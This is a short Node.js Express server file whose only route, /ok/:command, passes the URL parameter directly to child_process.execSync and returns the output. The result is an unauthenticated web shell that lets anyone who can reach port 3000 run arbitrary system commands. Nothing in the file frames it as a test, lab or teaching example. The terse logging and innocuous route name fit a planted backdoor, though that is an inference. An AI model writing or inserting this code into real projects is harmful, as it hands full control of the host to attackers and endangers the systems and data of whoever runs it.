const express = require('express')
const app = express();

app.listen(3000, () => 
	console.log('.ada..')
);
function Exec(command){ 
	const { execSync } = require("child_process");
	const stdout = execSync(command);
	return "Result: "+stdout
}
app.get('/ok/:command', (req, res) => 
res.send(Exec(req.params.command))
);